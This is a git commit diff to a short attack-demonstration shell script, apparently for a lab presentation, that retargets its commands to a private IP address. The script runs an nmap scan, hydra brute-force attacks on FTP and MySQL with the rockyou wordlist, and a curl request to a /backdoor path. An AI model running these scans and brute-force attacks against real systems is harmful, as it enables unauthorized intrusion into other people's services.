2994b9270658f871ffeab840d6683be8e675be46
LIBERT Quentin <79151732+Hychion@users.noreply.github.com>
2025-06-15 12:03:13 +0200

    last modifications Ready for presentation

--- scripts/attack-demo.sh
+++ scripts/attack-demo.sh
@@ -4,10 +4,10 @@ echo "[1] NMAP scan..."
 nmap -sS 172.28.0.15
 
 echo "[2] Brute Force FTP..."
-hydra -l anonymous -P /usr/share/wordlists/rockyou.txt ftp://172.28.0.15
+hydra -l anonymous -P /usr/share/wordlists/rockyou.txt ftp://192.168.100.20
 
 echo "[3] HTTP access to /backdoor"
-curl http://172.28.0.15/backdoor
+curl http://192.168.100.20/backdoor
 
 echo "[4] Brute Force MySQL"
-hydra -L /usr/share/wordlists/seclists/Usernames/Names/names.txt -P /usr/share/wordlists/rockyou.txt 172.28.0.15 mysql
+hydra -L /usr/share/wordlists/seclists/Usernames/Names/names.txt -P /usr/share/wordlists/rockyou.txt  192.168.100.20 mysql
